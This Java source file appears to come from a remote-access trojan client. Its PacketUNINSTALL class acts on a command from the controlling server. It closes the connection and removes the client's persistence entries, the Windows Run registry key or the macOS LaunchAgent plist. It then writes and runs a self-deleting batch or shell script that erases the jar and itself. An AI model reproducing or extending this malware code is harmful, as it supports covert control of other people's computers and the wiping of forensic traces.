package com.redpois0n.packets;

import java.io.File;
import java.io.FileWriter;
import java.util.Random;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.WinRegistry;
import com.redpois0n.common.os.OperatingSystem;
import com.redpois0n.utils.Utils;

public class PacketUNINSTALL extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		File me = Utils.getJarFile();

		try {
			Connection.socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		try {
			String fileName = Integer.toString( (new Random()).nextInt(10000));
			File file = null;
			String text = "";

			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);
				file = new File(fileName + ".bat");

				text += "pause\n";
				text += "del \"" + me.getAbsolutePath() + "\"" + "\n";
				text += "del %0";
				text = text.replace("\n", " & ");
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Utils.getJarFile().getName().replace(".jar", ".plist")).delete();
				file = new File(fileName + ".sh");
				
				text += "#!bin/bash\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			}

			if (file != null && text.length() > 0) {
				FileWriter writer = new FileWriter(file);
				writer.write(text);
				writer.close();

				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
					Runtime.getRuntime().exec(new String[] { "sh", file.getName() });
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		System.exit(0);
	}

}
